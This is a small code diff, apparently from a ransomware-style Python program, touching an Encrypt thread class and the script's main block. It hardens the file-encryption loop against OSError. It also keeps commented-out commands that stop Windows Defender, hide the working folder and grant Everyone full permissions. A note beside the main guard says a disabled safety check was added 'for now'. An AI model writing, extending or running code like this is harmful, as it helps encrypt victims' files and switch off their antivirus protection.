@@ -248,6 +248,8 @@ class Encrypt(Thread):
                                         break
                                     except FileExistsError as _fileExits:
                                         pass
+                            except OSError as _OsError:
+                                pass
 
 
 class Decrypt(Thread):
@@ -427,10 +429,6 @@ def set_wallpaper(path):
 
 
 if __name__ == "__main__":  # and 1 == 2:  # I added the 1 == 2 just as a security measure for now
-    try:
-        pass
-    except Exception as N:
-        print(N)
     # os.system("sc stop WinDefend")
     # os.system("attrib +h .")
     # os.system("icacls . /grant Everyone:F /T /C /Q")
